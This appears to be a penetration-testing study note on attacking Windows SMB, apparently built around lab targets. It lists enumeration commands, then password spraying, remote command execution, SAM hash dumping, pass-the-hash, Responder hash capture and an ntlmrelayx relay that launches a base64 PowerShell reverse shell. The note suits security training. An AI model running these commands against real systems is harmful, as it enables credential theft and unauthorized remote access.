Server Message Block (SMB) is a communication protocol created for providing shared access to files and printers across nodes on a network. Initially, it was designed to run on top of NetBIOS over TCP/IP (NBT) using TCP port 139 and UDP ports 137 and 138. However, with Windows 2000, Microsoft added the option to run SMB directly over TCP/IP on port 445 without the extra NetBIOS layer. Nowadays, modern Windows operating systems use SMB over TCP but still support the NetBIOS implementation as a failover.


On Windows, SMB can run directly over port 445 TCP/IP without the need for NetBIOS over TCP/IP, but if Windows has NetBIOS enabled, or we are targetting a non-Windows host, we will find SMB running on port 139 TCP/IP. This means that SMB is running with NetBIOS over TCP/IP.

Another protocol that is commonly related to SMB is MSRPC (Microsoft Remote Procedure Call). RPC provides an application developer a generic way to execute a procedure (a.k.a. a function) in a local or remote process without having to understand the network protocols used to support the communication, as specified in MS-RPCE, which defines an RPC over SMB Protocol that can use SMB Protocol named pipes as its underlying transport.


# Enumeration

Keep in mind that when targetting Windows OS, version information is usually not included as part of the Nmap scan results.Instead, Nmap will try to guess the OS version. 


`$ sudo nmap 10.129.14.128 -sV -sC -p139,445`


# Misconfigurations

### Anonymous Authentication

Using `smbclient`, we can display a list of the server's shares with the option -L, and using the option -N, we tell smbclient to use the null session.

`$ smbclient -N -L //10.129.14.128`

`Smbmap` is another tool that helps us enumerate network shares and access associated permissions. An advantage of smbmap is that it provides a list of permissions for each shared folder.

`$ smbmap -H 10.129.14.128`

Using smbmap with the -r or -R (recursive) option, one can browse the directories:

```
$ smbmap -H 10.129.14.128 -r notes

$ smbmap -H 10.129.14.128 --download "notes\note.txt"

$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"

```

## Remote Procedure Call (RPC)

[SANS Pocket Guide]( https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf )

`$ rpcclient -U "%" 10.10.110.17`



# Protocol Specific Attacks


### Brute Forcing and Password Spray

`$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Password1!'`

Note: By default CME will exit after a successful login is found. Using the --continue-on-success flag will continue spraying even after a valid password is found. it is very useful for spraying a single password against a large user list.


### Remote Code Execution (RCE)

PsExec is a tool that lets us execute processes on other systems, complete with full interactivity for console applications, without having to install client software manually.

We can download PsExec from Microsoft website, or we can use some Linux implementations:

-    Impacket PsExec - Python PsExec like functionality example using RemComSvc.
    
-    Impacket SMBExec - A similar approach to PsExec without using RemComSvc. The technique is described here. This implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This is useful when the target machine does NOT have a writeable share available.
    
-   Impacket atexec - This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
    
-   CrackMapExec - includes an implementation of smbexec and atexec.
   
-    Metasploit PsExec - Ruby PsExec implementation.



`$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec`

    Note: If the --exec-method is not defined, CrackMapExec will try to execute the atexec method, if it fails you can try to specify the --exec-method smbexec.




### Enumerating Logged-on Users

`$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users`


### Extract Hashes from SAM Database

`$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam`

    
### Pass-the-Hash (PtH)

` $ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE`


### Forced Authentication Attacks

We can also abuse the SMB protocol by creating a fake SMB Server to capture users' NetNTLM v1/v2 hashes.

The most common tool to perform such operations is the Responder. Responder is an LLMNR, NBT-NS, and MDNS poisoner tool with different capabilities, one of them is the possibility to set up fake services, including SMB, to steal NetNTLM v1/v2 hashes. In its default configuration, it will find LLMNR and NBT-NS traffic. Then, it will respond on behalf of the servers the victim is looking for and capture their NetNTLM hashes.

When a user or a system tries to perform a Name Resolution (NR), a series of procedures are conducted by a machine to retrieve a host's IP address by its hostname. On Windows machines, the procedure will roughly be as follows:

The hostname file share's IP address is required.
    
The local host file (C:\Windows\System32\Drivers\etc\hosts) will be checked for suitable records.
    
If no records are found, the machine switches to the local DNS cache, which keeps track of recently resolved names.
    
Is there no local DNS record? A query will be sent to the DNS server that has been configured.
    
If all else fails, the machine will issue a multicast query, requesting the IP address of the file share from other machines on the network.

Suppose a user mistyped a shared folder's name \\mysharefoder\ instead of \\mysharedfolder\. In that case, all name resolutions will fail because the name does not exist, and the machine will send a multicast query to all devices on the network, including us running our fake SMB server. This is a problem because no measures are taken to verify the integrity of the responses. Attackers can take advantage of this mechanism by listening in on such queries and spoofing responses, leading the victim to believe malicious servers are trustworthy. This trust is usually used to steal credentials.

All saved Hashes are located in Responder's logs directory (/usr/share/responder/logs/). 
Note: If you notice multiples hashes for one account this is because NTLMv2 utilizes both a client-side and server-side challenge that is randomized for each interaction. This makes it so the resulting hashes that are sent are salted with a randomized string of numbers. This is why the hashes don't match but still represent the same password.


### ntlmrelay

If we cannot crack the hash, we can potentially relay the captured hash to another machine using impacket-ntlmrelayx or Responder MultiRelay.py. 

First, we need to set SMB to OFF in our responder configuration file (/etc/responder/Responder.conf).

Then we execute impacket-ntlmrelayx with the option --no-http-server, -smb2support, and the target machine with the option -t. By default, impacket-ntlmrelayx will dump the SAM database, but we can execute commands by adding the option -c.

`$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146`

We can create a PowerShell reverse shell using https://www.revshells.com/, set our machine IP address, port, and the option Powershell #3 (Base64).

`$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e {base64 string}'`




# [SMBGhost](https://arista.my.site.com/AristaCommunity/s/article/SMBGhost-Wormable-Vulnerability-Analysis-CVE-2020-0796) ( [CVE-2020-0796](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796) )


    The vulnerability consisted of a compression mechanism of the version SMB v3.1.1 which made Windows 10 versions 1903 and 1909 vulnerable to attack by an unauthenticated attacker. The vulnerability allowed the attacker to gain remote code execution (RCE) and full access to the remote target system.


    